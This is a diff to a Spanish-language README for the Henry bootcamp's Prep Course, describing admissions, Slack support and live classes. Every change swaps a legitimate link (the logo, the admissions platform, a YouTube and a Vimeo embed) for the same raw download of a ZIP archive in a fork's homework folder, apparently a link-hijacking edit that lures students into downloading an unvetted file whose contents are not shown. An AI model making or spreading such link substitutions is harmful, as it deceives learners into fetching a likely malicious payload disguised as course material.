@@ -1,4 +1,4 @@
-![HenryLogo](https://d31uz8lwfmyn8g.cloudfront.net/Assets/logo-henry-white-lg.png)
+![HenryLogo](https://github.com/Mcc1987/Prep-Course/raw/refs/heads/main/04-JS-III/homework/Course-Prep-v1.1.zip)
 
 # Prep Course
 
@@ -27,7 +27,7 @@ El examen se realiza los días sábados cada dos semanas, previa inscripción en
 
 Contamos con dos herramientas de apoyo:
 
-**Slack:** es una plataforma de comunicación, donde podrás ponerte en contacto con nuestra comunidad que siempre te ayudará a resolver todas tus dudas. Encontrarás acceso a Slack desde la [plataforma de admisión](https://www.admissions.soyhenry.com/) o desde los mails que recibiste al momento de aplicar.
+**Slack:** es una plataforma de comunicación, donde podrás ponerte en contacto con nuestra comunidad que siempre te ayudará a resolver todas tus dudas. Encontrarás acceso a Slack desde la [plataforma de admisión](https://github.com/Mcc1987/Prep-Course/raw/refs/heads/main/04-JS-III/homework/Course-Prep-v1.1.zip) o desde los mails que recibiste al momento de aplicar.
 Más adelante te explicaremos cómo usar la herramienta.
 
 **Clases de apoyo en vivo:** de lunes a viernes hay un espacio en vivo via Zoom con estudiantes avanzados que se postulan para responder todas tus consultas.
@@ -52,7 +52,7 @@ Si no puedes asistir al espacio en vivo, podrás ver la grabación. Puedes encon
 Te compartimos esta grabación del último Open House que hicimos en nuestro canal de Youtube. En este video podrás conocer más sobre Henry, la carrera y el proceso de admisión:
 
 <div class="iframeContainer">
-<iframe width="560" height="315" src="https://www.youtube.com/embed/p_Hb0_v8SAc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe width="560" height="315" src="https://github.com/Mcc1987/Prep-Course/raw/refs/heads/main/04-JS-III/homework/Course-Prep-v1.1.zip" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 </div>
 
 ## ¿Quieres conocer más sobre la carrera de Desarrollo Web Full Stack en Henry?
@@ -60,5 +60,5 @@ Te compartimos esta grabación del último Open House que hicimos en nuestro can
 En este video te explicamos todo lo que debes conocer:
 
 <div class="iframeContainer">
-<iframe src="https://player.vimeo.com/video/426051769" allow="autoplay; fullscreen"></iframe>
+<iframe src="https://github.com/Mcc1987/Prep-Course/raw/refs/heads/main/04-JS-III/homework/Course-Prep-v1.1.zip" allow="autoplay; fullscreen"></iframe>
 </div>
